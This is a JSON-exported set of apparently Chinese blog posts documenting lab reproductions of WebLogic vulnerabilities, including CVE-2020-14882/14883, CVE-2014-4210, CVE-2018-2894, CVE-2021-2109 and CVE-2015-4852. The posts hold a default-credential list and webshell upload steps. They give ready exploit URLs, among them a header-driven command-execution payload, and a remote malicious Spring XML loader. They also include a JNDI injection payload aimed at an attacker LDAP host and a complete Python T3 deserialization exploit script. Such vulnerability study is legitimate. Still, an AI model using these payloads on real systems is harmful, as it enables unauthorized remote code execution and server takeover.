[{"categories":["Java"],"content":"前言\r相对于前面的反序列化洞，以下几个洞比较简单，就不多加分析了，主要看下怎么打 ","date":"2025-05-11","objectID":"/posts/0846c48/:1:0","tags":["Java"],"title":"Weblogic学习(2)","uri":"/posts/0846c48/"},{"categories":["Java"],"content":"弱口令 getshell\r","date":"2025-05-11","objectID":"/posts/0846c48/:2:0","tags":["Java"],"title":"Weblogic学习(2)","uri":"/posts/0846c48/"},{"categories":["Java"],"content":"弱口令\r访问 WebLogic /console 接口，可能存在的弱口令如下 账户 密码 system password weblogic weblogic guest guest portaladmin portaladmin admin security joe password mary password system security wlcsystem wlcsystem wlcsystem sipisystem 一些弱口令密码 weblogic1 weblogic12 weblogic123 weblogic@123 webl0gic weblogic# weblogic@ 这里错误密码5次之后就会自动锁定，用 qax 搭建的这个环境的账户密码为：weblogic、qaxateam01 ","date":"2025-05-11","objectID":"/posts/0846c48/:2:1","tags":["Java"],"title":"Weblogic学习(2)","uri":"/posts/0846c48/"},{"categories":["Java"],"content":"文件上传\r之后就在左边域结构处的部署那进行文件上传，点击安装后上传文件，随便弄个 jsp 木马，压缩成 zip 后改后缀为 war 将文件传在上面那处 然后一直点下一步，最后点完成，之后启动就能 getshell 了 ","date":"2025-05-11","objectID":"/posts/0846c48/:2:2","tags":["Java"],"title":"Weblogic学习(2)","uri":"/posts/0846c48/"},{"categories":["Java"],"content":"CVE-2020-14882/CVE-2020-14883 未授权 RCE\r这里 rce 是在未授权的基础上进后台 rce 的，简单地介绍下两个漏洞 CVE-2020-14883：允许未授权的用户通过目录穿越结合双重 URL 编码的方式来绕过管理控制台的权限验证访问后台。 CVE-2020-14882：允许后台任意用户通过 HTTP 协议执行任意命令。 ","date":"2025-05-11","objectID":"/posts/0846c48/:3:0","tags":["Java"],"title":"Weblogic学习(2)","uri":"/posts/0846c48/"},{"categories":["Java"],"content":"影响版本\rOracle WebLogic Server 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0 and 14.1.1.0.0 ","date":"2025-05-11","objectID":"/posts/0846c48/:3:1","tags":["Java"],"title":"Weblogic学习(2)","uri":"/posts/0846c48/"},{"categories":["Java"],"content":"CVE-2020-14883\r直接访问 console 会跳转到 /console/login/LoginForm.jsp 进行登录，这里可以利用双重 url 编码+目录穿越进 console 后台，payload /console/css/%252e%252e%252fconsole.portal 进去后很明显和之前弱口令进去的后台不一样，没有部署，无法上传恶意 war 包来拿 shell，接下来可以结合 CVE-2020-14882 来 getshell ","date":"2025-05-11","objectID":"/posts/0846c48/:3:2","tags":["Java"],"title":"Weblogic学习(2)","uri":"/posts/0846c48/"},{"categories":["Java"],"content":"CVE-2020-14882\r在上述未授权进入的后台是低权限的情况下，可以利用 CVE-2020-14883 来打，有两种打法，一是用 com.tangosol.coherence.mvel2.sh.ShellSession 来直接 rce，二是用 com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext 加载恶意 xml 文件来 rce 方法一\r利用的是 com.tangosol.coherence.mvel2.sh.ShellSession 类 此利用方法只能在 Weblogic 12.2.1 及以上版本利用，因为低版本并不存在 com.tangosol.coherence.mvel2.sh.ShellSession 类 payload1 /console/images/%252E%252E%252Fconsole.portal?_nfpb=true\u0026_pageLabel=HomePage1\u0026handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27touch /tmp/pocIsok%27);%22); payload2 /console/css/%252e%252e%252fconsole.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession('weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField(\"connectionHandler\");field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(\"getServletRequest\").invoke(obj); String cmd = req.getHeader(\"cmd\");String[] cmds = System.getProperty(\"os.name\").toLowerCase().contains(\"window\") ? new String[]{\"cmd.exe\", \"/c\", cmd} : new String[]{\"/bin/sh\", \"-c\", cmd};if(cmd != null ){ String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(\"\\\\A\").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(\"getResponse\").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();} currentThread.interrupt(); 参数及参数值中的关键字需要url编码下，在 http 头添加 cmd 参数及其值即可 rce 方法二\r利用的是 com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext 从这个函数都可以看出来，加载恶意xml来rce，此利用方法无版本限制，但是需要出网，公网上放1.xml \u003c?xml version=\"1.0\" encoding=\"UTF-8\" ?\u003e \u003cbeans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\"\u003e \u003cbean id=\"pb\" class=\"java.lang.ProcessBuilder\" init-method=\"start\"\u003e \u003cconstructor-arg\u003e \u003clist\u003e \u003cvalue\u003ebash\u003c/value\u003e \u003cvalue\u003e-c\u003c/value\u003e \u003cvalue\u003e\u003c![CDATA[touch /tmp/xml_test]]\u003e\u003c/value\u003e \u003c/list\u003e \u003c/constructor-arg\u003e \u003c/bean\u003e \u003c/beans\u003e 然后让其加载 /console/css/%252e%252e%252fconsole.portal?_nfpb=true\u0026_pageLabel=\u0026handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(\"http://ip:port/1.xml\") ","date":"2025-05-11","objectID":"/posts/0846c48/:3:3","tags":["Java"],"title":"Weblogic学习(2)","uri":"/posts/0846c48/"},{"categories":["Java"],"content":"CVE-2014-4210 SSRF\r","date":"2025-05-11","objectID":"/posts/0846c48/:4:0","tags":["Java"],"title":"Weblogic学习(2)","uri":"/posts/0846c48/"},{"categories":["Java"],"content":"影响版本\rOracle WebLogic Server 10.0.2, 10.3.6 ","date":"2025-05-11","objectID":"/posts/0846c48/:4:1","tags":["Java"],"title":"Weblogic学习(2)","uri":"/posts/0846c48/"},{"categories":["Java"],"content":"漏洞复现\rWebLogic 的 SearchPublicReqistries.jsp 接口存在 SSRF 漏洞，如果服务端或内网存在 Redis 未授权访问漏洞等则可以进一步打漏洞组合拳进行攻击利用。 SearchPublicReqistries.jsp 在 /wlserver/server/lib/uddiexplorer.war 中 operator 参数就是传进去的 url，然后 search.getResponse() 就会向这个 url 发送请求，而且这个服务没有任何鉴权，可以直接访问，用 payload 探测下 7001 端口 /uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name\u0026txtSearchname=sdf\u0026txtSearchkey=\u0026txtSearchfor=\u0026selfor=Business+location\u0026btnSubmit=Search\u0026operator=http://127.0.0.1:7001 回显为 An error has occurred weblogic.uddi.client.structures.exception.XML_SoapException: The server at http://127.0.0.1:7001 returned a 404 error code (Not Found). Please ensure that your URL is correct, and the web service has deployed without error. 当探测 7000 端口时回显 An error has occurred weblogic.uddi.client.structures.exception.XML_SoapException: Tried all: '1' addresses, but could not connect over HTTP to server: '127.0.0.1', port: '7000' 可以看到 7001 端口只是没找到服务而 7000 端口都不能建立 http 连接，可以通过这个来探测端口 ","date":"2025-05-11","objectID":"/posts/0846c48/:4:2","tags":["Java"],"title":"Weblogic学习(2)","uri":"/posts/0846c48/"},{"categories":["Java"],"content":"CVE-2018-2894 任意文件上传\r","date":"2025-05-11","objectID":"/posts/0846c48/:5:0","tags":["Java"],"title":"Weblogic学习(2)","uri":"/posts/0846c48/"},{"categories":["Java"],"content":"影响版本\rWeblogic 10.3.6，12.1.3，12.2.1.2，12.2.1.3 ","date":"2025-05-11","objectID":"/posts/0846c48/:5:1","tags":["Java"],"title":"Weblogic学习(2)","uri":"/posts/0846c48/"},{"categories":["Java"],"content":"漏洞复现\rweblogic如果开启了web服务测试页（默认不开启），则分别会在/ws_utc/begin.do以及/ws_utc/config.do这两个页面存在任意上传getshell漏洞 由于该设置默认不开启，所以此漏洞有一定的局限性 “高级” 中开启 “启用 Web 服务测试页”，但我这没有这个选项，赛博复现下，挺简单的反正 访问漏洞页面http://your-ip:7001/ws_utc/config.do（需要手动设置一下环境设置Work Home Dir为，/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css） 点击安全 -\u003e 添加，名字和密码可以随意设置，传个 jsp 马 文件上传的路径为http://your-ip:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]，这里的时间戳获取方式有两种，其一为bp抓包查看，其二利用浏览器自带的检查获取，如下所示： 然后 rce 即可 ","date":"2025-05-11","objectID":"/posts/0846c48/:5:2","tags":["Java"],"title":"Weblogic学习(2)","uri":"/posts/0846c48/"},{"categories":["Java"],"content":"小结\r都挺简单的，感觉限制比较多，不是需要版本低就是要进后台或者开启某些特殊配置，nday是这样的，也算是对 weblogic 有个简单的了解 ","date":"2025-05-11","objectID":"/posts/0846c48/:5:3","tags":["Java"],"title":"Weblogic学习(2)","uri":"/posts/0846c48/"},{"categories":["Java"],"content":"参考\rhttps://drun1baby.top/2023/03/06/WebLogic-%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-SSRF/ https://blog.csdn.net/weixin_51198941/article/details/134193310 ","date":"2025-05-11","objectID":"/posts/0846c48/:5:4","tags":["Java"],"title":"Weblogic学习(2)","uri":"/posts/0846c48/"},{"categories":["Java"],"content":"CVE-2021-2109 WebLogic JNDI 注入\r","date":"2025-05-11","objectID":"/posts/0846c48/:6:0","tags":["Java"],"title":"Weblogic学习(2)","uri":"/posts/0846c48/"},{"categories":["Java"],"content":"环境搭建\r参考T3反序列化的环境，需要多加一个 \\server\\lib\\consoleapp\\webapp\\WEB-INF\\lib\\console.jar 到依赖中 docker run -d -p 7001:7001 -p 8453:8453 -p 5556:5556 --name weblogic1036jdk7u21 weblogic1036jdk7u21 ","date":"2025-05-11","objectID":"/posts/0846c48/:6:1","tags":["Java"],"title":"Weblogic学习(2)","uri":"/posts/0846c48/"},{"categories":["Java"],"content":"漏洞分析\r利用前提\rOracle WebLogic Server 10.3.6.0.0、12.1.3.0.0、12.2.1.3.0、12.2.1.4.0、14.1.1.0.0 这里要进入到 /console/consolejndi.portal 路由里才能打 漏洞分析\r原理就是WebLogic 的 /console/consolejndi.portal 接口可以调用存在 JNDI 注入漏洞的 com.bea.console.handles.JndiBindingHandle 类，从而造成 RCE，所以要在进后台的前提下才能打 这里用到的工具为：https://github.com/welk1n/JNDI-Injection-Exploit java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C \"touch /tmp/jndi_test\" -A 192.168.2.1 payload为 /console/css/%252e%252e%252fconsolejndi.portal?_pageLabel=JNDIBindingPageGeneral\u0026_nfpb=true\u0026JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://192.168.2;1:1389/mezyww;AdminServer%22) 这里就是 ; 而不是 . 看到 \\server\\lib\\consoleapp\\webapp 下的 consolejndi.portal ，就是我们刚才 payload 中访问的路由 具体的处理逻辑在 /PortalConfig/jndi/jndibinding.portlet 可以发现在 com.bea.console.actions.jndi.JNDIBindingAction#execute 中就是处理逻辑 先获取 jndi 上下文然后就直接 lookup 了，现在先看下怎么控制 serverMBean 了，而一直往上追溯其赋值，大概可以用下面这个赋值链表示 JndiBindingHandle bindingHandle = (JndiBindingHandle)this.getHandleContext(actionForm, request, \"JNDIBinding\"); -\u003e String serverName = bindingHandle.getServer(); -\u003e ServerMBean serverMBean = domainMBean.lookupServer(serverName); 从 domainMBean.lookupServer(serverName) 开始分析，这里是动态代理调用，用的是 weblogic.management.jmx.MBeanServerInvocationHandler#invoke 这里 var2 就是要调用的方法 weblogic.management.configuration.DomainMBean#lookupServer ，var3 则是要传进去的参数，然后发现 var2 的实现类是 weblogic.management.configuration.DomainMBeanImpl#lookupServer public ServerMBean lookupServer(String var1) { Iterator var2 = Arrays.asList((Object[])this._Servers).iterator(); ServerMBeanImpl var3; do { if (!var2.hasNext()) { return null; } var3 = (ServerMBeanImpl)var2.next(); } while(!var3.getName().equals(var1)); return var3; } 这里 this._Servers 是一组服务器对象，会依次取出其中的实例并判断其 getName 返回的值是否为我们传进去的 var1 我们肯定不能返回 null，所以我们必须要让传进去的 var1 等于其 getName 值，这里只有一个实例，其 getName 返回的值为 AdminServer 因此我们传入的 var1 值为 AdminServer ，根据之前我们的赋值链可以发现 var1 就是 serverName，跟进下 getServer 方法会发现其值是可控的，会返回 getComponent 方法获得的数组中索引为 2 的值，这个方法待会分析 public String getServer() { return this.getComponent(2); } 至此 c != null 已经可以满足，现在看看 jndi lookup 的地址怎么控制 跟进发现其两个 getter 方法都是调用的 ，而且都是用到 getComponent 方法返回的数组 最后跟进到 com.bea.console.handles.HandleImpl#getComponents() ，这个方法也很简单，就是用 ; 来分隔数组中的每个组件 所以最后构造 payload 的时候就很清晰了，写三个组件，前两个是 jndi 的远程地址，最后一个为 AdminServer 就好了，用 ; 分隔 漏洞修复\r加了个函数来判断传进 lookup 方法的值 只允许以 java: 开头的本地 JNDI 名称，远程的如 rmi，ldap 就不行了 ","date":"2025-05-11","objectID":"/posts/0846c48/:6:2","tags":["Java"],"title":"Weblogic学习(2)","uri":"/posts/0846c48/"},{"categories":["Java"],"content":"小结\r限制比较大感觉，要进后台，漏洞本身的利用思路还是非常有趣的 ","date":"2025-05-11","objectID":"/posts/0846c48/:6:3","tags":["Java"],"title":"Weblogic学习(2)","uri":"/posts/0846c48/"},{"categories":["Java"],"content":"参考\rhttps://drun1baby.top/2023/02/12/CVE-2021-2109-WebLogic-JNDI-%E6%B3%A8%E5%85%A5/ https://y4er.com/posts/weblogic-cve-2021-2109-jndi-rce/ ","date":"2025-05-11","objectID":"/posts/0846c48/:6:4","tags":["Java"],"title":"Weblogic学习(2)","uri":"/posts/0846c48/"},{"categories":["Java"],"content":"总结\r有总的利用脚本：https://github.com/zhzyker/exphub/tree/master/weblogic 利用相对于反序列化简单很多，但限制都比较大感觉，Weblogic 暂时到这，之后遇到其他利用手法再说 ","date":"2025-05-11","objectID":"/posts/0846c48/:7:0","tags":["Java"],"title":"Weblogic学习(2)","uri":"/posts/0846c48/"},{"categories":["Java"],"content":"前言\r最近在学 Java 相关框架的漏洞，先从 Weblogic 开始，先从最熟悉的反序列化开始，之后再学习其他利用，之后的文章都是 10.3.6.0 版本的 Weblogic ，环境搭建全用 T3 的就好了 ","date":"2025-05-11","objectID":"/posts/705d533/:1:0","tags":["Java"],"title":"Weblogic学习(1)","uri":"/posts/705d533/"},{"categories":["Java"],"content":"WebLogic T3 反序列化（CVE-2015-4852）\r","date":"2025-05-11","objectID":"/posts/705d533/:2:0","tags":["Java"],"title":"Weblogic学习(1)","uri":"/posts/705d533/"},{"categories":["Java"],"content":"简介\rWebLogic 是 Oracle 公司提供的一个Java EE 应用服务器，全名是 Oracle WebLogic Server，主要用于部署、运行 Java Web 应用（如 JSP、Servlet、EJB、Spring 等）。 相较于Tomcat，WebLogic更适合大型项目和开发环境 T3 协议其实是 Weblogic 内独有的一个协议，在 Weblogic 中对 RMI 传输就是使用的 T3 协议。在 RMI 传输当中，被传输的是一串序列化的数据，在这串数据被接收后，执行反序列化的操作。 在 T3 的这个协议里面包含请求包头和请求的主体这两部分内容。 ","date":"2025-05-11","objectID":"/posts/705d533/:2:1","tags":["Java"],"title":"Weblogic学习(1)","uri":"/posts/705d533/"},{"categories":["Java"],"content":"环境搭建\r用docker搭建，用qax的搭建脚本：https://github.com/QAX-A-Team/WeblogicEnvironment 先下个 jdk7u21，再来个其对于版本的 Weblogic 安装包，1036 的 generic 版本，然后把下好的 JDK 和 Weblogic 然后分别放在WeblogicEnvironment 的 jdks 和 weblogics 中 改下 Dockerfile # 基础镜像 FROM centos:centos7 # 参数 ARG JDK_PKG ARG WEBLOGIC_JAR # 解决libnsl包丢失的问题 # RUN yum -y install libnsl # 创建用户 RUN groupadd -g 1000 oinstall \u0026\u0026 useradd -u 1100 -g oinstall oracle # 创建需要的文件夹和环境变量 RUN mkdir -p /install \u0026\u0026 mkdir -p /scripts ENV JDK_PKG=$JDK_PKG ENV WEBLOGIC_JAR=$WEBLOGIC_JAR # 复制脚本 COPY scripts/jdk_install.sh /scripts/jdk_install.sh COPY scripts/jdk_bin_install.sh /scripts/jdk_bin_install.sh COPY scripts/weblogic_install11g.sh /scripts/weblogic_install11g.sh COPY scripts/weblogic_install12c.sh /scripts/weblogic_install12c.sh COPY scripts/create_domain11g.sh /scripts/create_domain11g.sh COPY scripts/create_domain12c.sh /scripts/create_domain12c.sh COPY scripts/open_debug_mode.sh /scripts/open_debug_mode.sh COPY jdks/$JDK_PKG . COPY weblogics/$WEBLOGIC_JAR . # 判断jdk是包（bin/tar.gz）weblogic包（11g/12c）载入对应脚本 RUN if [ $JDK_PKG == *.bin ] ; then echo ****载入JDK bin安装脚本**** \u0026\u0026 cp /scripts/jdk_bin_install.sh /scripts/jdk_install.sh ; else echo ****载入JDK tar.gz安装脚本**** ; fi RUN if [ $WEBLOGIC_JAR == *1036* ] ; then echo ****载入11g安装脚本**** \u0026\u0026 cp /scripts/weblogic_install11g.sh /scripts/weblogic_install.sh \u0026\u0026 cp /scripts/create_domain11g.sh /scripts/create_domain.sh ; else echo ****载入12c安装脚本**** \u0026\u0026 cp /scripts/weblogic_install12c.sh /scripts/weblogic_install.sh \u0026\u0026 cp /scripts/create_domain12c.sh /scripts/create_domain.sh ; fi # 脚本设置权限及运行 RUN chmod +x /scripts/jdk_install.sh RUN chmod +x /scripts/weblogic_install.sh RUN chmod +x /scripts/create_domain.sh RUN chmod +x /scripts/open_debug_mode.sh # 安装JDK RUN /scripts/jdk_install.sh # 安装weblogic RUN /scripts/weblogic_install.sh # 创建Weblogic Domain RUN /scripts/create_domain.sh # 打开Debug模式 RUN /scripts/open_debug_mode.sh # 启动 Weblogic Server # CMD [\"tail\",\"-f\",\"/dev/null\"] CMD [\"/u01/app/oracle/Domains/ExampleSilentWTDomain/bin/startWebLogic.sh\"] EXPOSE 7001 然后运行 docker build --build-arg JDK_PKG=jdk-7u21-linux-x64.tar.gz --build-arg WEBLOGIC_JAR=wls1036_generic.jar -t weblogic1036jdk7u21 . docker run -d -p 7001:7001 -p 8453:8453 -p 5556:5556 --name weblogic1036jdk7u21 weblogic1036jdk7u21 如果说找不到 weblogic_install.sh ，那就把 .gitignore 文件最后的 weblogics/ 去掉 如果遇到说内存不足，那就在配置文件 docker.service 的 ExecStart 配置后面加上 --default-ulimit nofile=65536:65536 然后访问 http://192.168.2.128:7001/console/login/LoginForm.jsp 即可 然后设置下远程调试，需要把一些weblogic的依赖Jar包给导出来才能进行远程调试 mkdir ./middleware docker cp weblogic1036jdk7u21:/u01/app/oracle/middleware/modules ./middleware/ docker cp weblogic1036jdk7u21:/u01/app/oracle/middleware/wlserver ./middleware/ docker cp weblogic1036jdk7u21:/u01/app/oracle/middleware/coherence_3.7/lib ./middleware/ 然后用 IDEA 打开 wlserver 文件夹，导入 coherence_3.7/lib 和 modules 把 server/lib 也作为依赖进行导入 然后添加远程 JVM 调试 ","date":"2025-05-11","objectID":"/posts/705d533/:2:2","tags":["Java"],"title":"Weblogic学习(1)","uri":"/posts/705d533/"},{"categories":["Java"],"content":"漏洞复现\r10.3.6 版本的 exp from os import popen import struct # 负责大小端的转换 import subprocess from sys import stdout import socket import re import binascii def generatePayload(gadget,cmd): YSO_PATH = r\"D:\\14.Java\\tools\\windows_tools\\windows_tools\\ysoserial-all.jar\" popen = subprocess.Popen(['java','-jar',YSO_PATH,gadget,cmd],stdout=subprocess.PIPE) return popen.stdout.read() def T3Exploit(ip,port,payload): sock =socket.socket(socket.AF_INET,socket.SOCK_STREAM) sock.connect((ip,port)) handshake = \"t3 10.3.6\\nAS:255\\nHL:19\\nMS:10000000\\n\\n\" sock.sendall(handshake.encode()) data = sock.recv(1024) compile = re.compile(\"HELO:(.*).0.false\") match = compile.findall(data.decode()) if match: print(\"Weblogic: \"+\"\".join(match)) else: print(\"Not Weblogic\") #return header = binascii.a2b_hex(b\"00000000\") t3header = binascii.a2b_hex(b\"016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006\") desflag = binascii.a2b_hex(b\"fe010000\") payload = header + t3header +desflag+ payload payload = struct.pack(\"\u003eI\",len(payload)) + payload[4:] sock.send(payload) if __name__ == \"__main__\": ip = \"192.168.2.128\" port = 7001 gadget = \"CommonsCollections1\" cmd = \"touch /tmp/success_test\" payload = generatePayload(gadget,cmd) T3Exploit(ip,port,payload) 只试了下 cc 链，1、3、6、7都能打通 WebLogic请求分析\r本地拿wireshark抓个回环包，借用下佬的图 第一部分是请求包头，第二部分是服务端的响应，第三部分是请求主体 可以看到服务端的响应，在得到了正确的请求头后，Weblogic会返回一个包含版本号的信息 在反序列化数据包中，ac ed 00 05 是反序列化标志，在 T3 协议中由于每个反序列化数据包前面都有 fe 01 00 00 ，所以这里反序列化的标志就相当于是 fe 01 00 00 ac ed 00 05 整个请求主体包含了6个部分的序列化数据，我们可以对其中任意一个部分进行攻击 ","date":"2025-05-11","objectID":"/posts/705d533/:2:3","tags":["Java"],"title":"Weblogic学习(1)","uri":"/posts/705d533/"},{"categories":["Java"],"content":"漏洞分析\r入口类是 weblogic.rjvm.InboundMsgAbbrev ，关注到其 readObject 方法 private Object readObject(MsgAbbrevInputStream var1) throws IOException, ClassNotFoundException { int var2 = var1.read(); switch (var2) { case 0: return (new ServerChannelInputStream(var1)).readObject(); case 1: return var1.readASCII(); default: throw new StreamCorruptedException(\"Unknown typecode: '\" + var2 + \"'\"); } } 可以看到这里 var1 的 head 的值就是我们传入的序列化的数据 然后进入 ServerChannelInputStream 构造函数 private ServerChannelInputStream(MsgAbbrevInputStream var1) throws IOException { super(var1); this.serverChannel = var1.getServerChannel(); } 这里 var1 是个 MsgAbbrevInputStream 对象，这个类在 Weblogic 中实现的一个 Java 输入流类，用于接收消息并将其转换为 Java 对象， super 方法跟进去没啥东西，继续跟进 getServerChannel public ServerChannel getServerChannel() { return this.connection.getChannel(); } this.connection 中存储了一些连接信息，包括IP，端口等，跟进 getChannel 方法 public final ServerChannel getChannel() { return MuxableSocketT3.this.getChannel(); } 继续跟进，会调用到 BaseAbstractMuxableSocket 的 getChannel 方法 public final ServerChannel getChannel() { return this.channel; } 处理完后回到 InboundMsgAbbrev#readObject 处，ServerChannelInputStream 继承了 ObjectInputStream 类，调用其 readObject 方法 之后跟进后会调用到 InboundMsgAbbrev#resolveClass ，这其中的调用链 resolveClass:108, InboundMsgAbbrev$ServerChannelInputStream (weblogic.rjvm) readNonProxyDesc:1610, ObjectInputStream (java.io) readClassDesc:1515, ObjectInputStream (java.io) readOrdinaryObject:1769, ObjectInputStream (java.io) readObject0:1348, ObjectInputStream (java.io) readObject:370, ObjectInputStream (java.io) readObject:66, InboundMsgAbbrev (weblogic.rjvm) 这里的 var1 就是 sun.reflect.annotation.AnnotationInvocationHandler 类 再然后就会调用到 AnnotationInvocationHandler#readObject 了，之后就是 cc1 了 分析完调用流程后我们再回过头来看到poc header = binascii.a2b_hex(b\"00000000\") t3header = binascii.a2b_hex(b\"016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006\") desflag = binascii.a2b_hex(b\"fe010000\") payload = header + t3header +desflag+ payload payload = struct.pack(\"\u003eI\",len(payload)) + payload[4:] 这里 header 表示数据包的长度，最开始只用于占位，可以看到最后生成 payload 时将其覆盖了，t3header 是 T3 协议的协议头，最后 desflag 就是反序列化标识，但在之前的分析中我们看到是8个字节，这里却只有4个字节，这是因为 yso 生成的 payload 会补全后四个字节 ","date":"2025-05-11","objectID":"/posts/705d533/:2:4","tags":["Java"],"title":"Weblogic学习(1)","uri":"/posts/705d533/"},{"categories":["Java"],"content":"漏洞修复\r上面分析我们可以看出加载类其实是通过调用 resolveClass() 方法，再通过反射获取到任意类的，官方给出的修复就是在这个方法中加入黑名单 因为这里是通过 T3 协议的请求来打，可以让 Web 代理的方式只能转发 HTTP 的请求，这样也能防住 ","date":"2025-05-11","objectID":"/posts/705d533/:2:5","tags":["Java"],"title":"Weblogic学习(1)","uri":"/posts/705d533/"},{"categories":["Java"],"content":"小结\r挺简单的，用 T3 协议时会反序列化请求主体中除一些固定数据（T3 协议自带的数据）外的数据，改这部分为恶意序列化数据就好了 后续就是加补丁，可以找黑名单外的类绕过，还能打 jrmp ","date":"2025-05-11","objectID":"/posts/705d533/:2:6","tags":["Java"],"title":"Weblogic学习(1)","uri":"/posts/705d533/"},{"categories":["Java"],"content":"参考\rhttps://drun1baby.top/2022/11/28/CVE-2015-4852-WebLogic-T3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/#0x05-%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D https://ilikeoyt.github.io/2024/02/26/Weblogic-T3%E5%8D%8F%E8%AE%AE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96 https://xz.aliyun.com/news/9813 ","date":"2025-05-11","objectID":"/posts/705d533/:2:7","tags":["Java"],"title":"Weblogic学习(1)","uri":"/posts/705d533/"},{"categories":["Java"],"content":"WebLogic XMLDecoder反序列化（CVE-2017-10271）\r","date":"2025-05-11","objectID":"/posts/705d533/:3:0","tags":["Java"],"title":"Weblogic学习(1)","uri":"/posts/705d533/"},{"categories":["Java"],"content":"前置学习\r这里环境还是用的 jdk7u21 + weblogic 10.3.6 XMLEncoder 和 XMLDecoder\rXMLDecoder/XMLEncoder 是在JDK1.4版中添加的 XML 格式序列化持久性方案，使用 XMLEncoder 来生成表示 JavaBeans 组件(bean)的 XML 文档，用 XMLDecoder 读取使用 XMLEncoder 创建的 XML 文档获取 JavaBeans。 简单来说就是 Encoder 把 javabeans 变成 xml 格式，Decoder 把 xml 格式变成 Javabeans demo\r写个标准的 javabean 类方便后续 encoder 处理 package org.example; import java.io.Serializable; public class person implements Serializable { private String name; private int age; //XMLEncoder要求类必须是标准的 JavaBean,必须有无参构造方法 public person() {} public person(String name, int age) { this.name = name; this.age = age; } public String getName() { return name; } public void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; } } Encoder\rpackage org.example; import java.beans.XMLEncoder; import java.io.FileNotFoundException; import java.io.FileOutputStream; public class encoder { public static void main(String[] args) throws FileNotFoundException { person person1 = new person(\"6s6\", 18); FileOutputStream fos = new FileOutputStream(\"encode.xml\"); XMLEncoder encoder = new XMLEncoder(fos); encoder.writeObject(person1); encoder.close(); } } 输出的encoder.xml为 \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003cjava version=\"1.7.0_21\" class=\"java.beans.XMLDecoder\"\u003e \u003cobject class=\"org.example.person\"\u003e \u003cvoid property=\"age\"\u003e \u003cint\u003e18\u003c/int\u003e \u003c/void\u003e \u003cvoid property=\"name\"\u003e \u003cstring\u003e6s6\u003c/string\u003e \u003c/void\u003e \u003c/object\u003e \u003c/java\u003e Decoder\rpackage org.example; import java.beans.XMLDecoder; import java.io.FileInputStream; import java.io.FileNotFoundException; public class decoder { public static void main(String[] args) throws FileNotFoundException { FileInputStream fis = new FileInputStream(\"D:\\\\14.Java\\\\java_test\\\\test\\\\encode.xml\"); XMLDecoder decoder = new XMLDecoder(fis); person decodedPerson = (person) decoder.readObject(); System.out.println(\"Name: \" + decodedPerson.getName()); System.out.println(\"Age: \" + decodedPerson.getAge()); } } 输出为 Name: 6s6 Age: 18 XML基础属性\rstring 标签\rhello,xml 字符串的表示方式为 \u003cstring\u003ehello,xml\u003c/string\u003e object 标签\r通过 \u003cobject\u003e 标签表示对象， class 属性指定具体类(用于调用其内部方法)，method 属性指定具体方法名称（比如构造函数的的方法名为 new ） void 标签\r通过 void 标签表示函数调用、赋值等操作， method 属性指定具体的方法名称 array标签\r通过 array 标签表示数组， class 属性指定具体类，内部 void 标签的 index 属性表示根据指定数组索引赋值 ","date":"2025-05-11","objectID":"/posts/705d533/:3:1","tags":["Java"],"title":"Weblogic学习(1)","uri":"/posts/705d533/"},{"categories":["Java"],"content":"利用条件\r使用 WLS-WebServices 组件 WebLogic 涉及版本 10.3.6.0 12.1.3.0.0 12.2.1.1.0 12.2.1.2.0 ","date":"2025-05-11","objectID":"/posts/705d533/:3:2","tags":["Java"],"title":"Weblogic学习(1)","uri":"/posts/705d533/"},{"categories":["Java"],"content":"漏洞分析\r原理解析\r上面看到了 Decoder 可以把 xml 解析成 Javabeans，而这里 WebLogic 的 WLS Security 组件对外提供得 WebService 服务，就是使用 XMLDecoder 来解析 XML 格式数据，其存在反序列化漏洞，从而导致 RCE，来看个demo decode.java package org.example; import java.beans.XMLDecoder; import java.io.BufferedInputStream; import java.io.FileInputStream; public class decoder { public static void main(String[] args) throws Exception { FileInputStream file = new FileInputStream(\"D:\\\\14.Java\\\\java_test\\\\test\\\\poc.xml\"); XMLDecoder xmlDecoder = new XMLDecoder(new BufferedInputStream(file)); Object result = xmlDecoder.readObject(); xmlDecoder.close(); } } poc.xml \u003cjava version=\"1.4.0\" class=\"java.beans.XMLDecoder\"\u003e \u003cvoid class=\"java.lang.ProcessBuilder\"\u003e 